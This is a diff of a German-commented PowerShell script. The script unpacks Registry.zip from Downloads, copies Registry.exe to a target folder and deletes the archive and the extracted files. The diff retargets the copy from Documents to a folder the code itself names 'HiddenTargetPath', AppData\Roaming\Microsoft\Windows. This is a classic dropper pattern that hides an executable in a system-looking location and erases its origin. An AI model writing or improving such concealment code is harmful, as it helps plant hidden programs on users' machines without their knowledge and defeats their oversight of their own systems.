@@ -1,18 +1,18 @@
 # Setze Pfade
-$Downloads = [Environment]::GetFolderPath("UserProfile") + "\Downloads"
+$UserProfile = [Environment]::GetFolderPath("UserProfile")
+$Downloads = Join-Path $UserProfile "Downloads"
 $ZipPath = Join-Path $Downloads "Registry.zip"
 $ExtractPath = Join-Path $Downloads "Registry"
 $ExeName = "Registry.exe"
 $ExeSource = Join-Path $ExtractPath $ExeName
-$DocPath = [Environment]::GetFolderPath("MyDocuments")
-$ExeTarget = Join-Path $DocPath $ExeName
+$HiddenTargetPath = Join-Path $UserProfile "AppData\Roaming\Microsoft\Windows"
+$ExeTarget = Join-Path $HiddenTargetPath $ExeName
 
 # Wenn ZIP vorhanden ist, entpacken
 if (Test-Path $ZipPath) {
     Write-Host "[+] Registry.zip gefunden."
 
     try {
-        # Entpacken
         Expand-Archive -Path $ZipPath -DestinationPath $ExtractPath -Force
         Write-Host "[+] ZIP entpackt nach $ExtractPath"
     } catch {
@@ -22,12 +22,12 @@ if (Test-Path $ZipPath) {
     # .exe verschieben, falls vorhanden
     if (Test-Path $ExeSource) {
         Copy-Item -Path $ExeSource -Destination $ExeTarget -Force
-        Write-Host "[+] Registry.exe nach Dokumente kopiert: $ExeTarget"
+        Write-Host "[+] Registry.exe nach $ExeTarget kopiert"
     } else {
         Write-Host "[-] Registry.exe nicht gefunden in $ExtractPath"
     }
 
-    # ZIP löschen
+    # ZIP und entpackten Ordner löschen
     try {
         Remove-Item -Path $ZipPath -Force -ErrorAction Stop
         Write-Host "[+] Registry.zip gelöscht."
@@ -35,7 +35,6 @@ if (Test-Path $ZipPath) {
         Write-Host "[-] Fehler beim Löschen der ZIP: $_"
     }
 
-    # Entpackten Ordner löschen
     try {
         Remove-Item -Path $ExtractPath -Recurse -Force -ErrorAction Stop
         Write-Host "[+] Ordner 'Registry' gelöscht."
